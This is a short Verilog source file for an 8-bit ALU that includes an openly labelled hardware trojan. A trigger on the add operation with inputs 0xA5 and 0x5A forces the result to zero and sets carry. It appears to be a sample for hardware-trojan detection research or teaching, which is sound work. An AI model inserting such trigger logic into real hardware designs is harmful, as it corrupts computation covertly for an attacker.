module alu8(input [7:0] a, input [7:0] b, input [2:0] op,
           output reg [7:0] y, output reg cout, output zero);
  wire trojan_trigger;
  assign trojan_trigger = (op == 3'd0) && (a == 8'hA5) && (b == 8'h5A);

  always @(*) begin
    cout = 1'b0;
    case(op)
      3'd0: {cout, y} = a + b;
      3'd1: {cout, y} = a - b;
      3'd2: y = a & b;
      3'd3: y = a | b;
      3'd4: y = a ^ b;
      3'd5: y = ~a;
      3'd6: y = a << 1;
      3'd7: y = a >> 1;
    endcase
    if (trojan_trigger) begin
      cout = 1'b1;
      y = 8'h00;
    end
  end
  assign zero = (y == 8'b0);
endmodule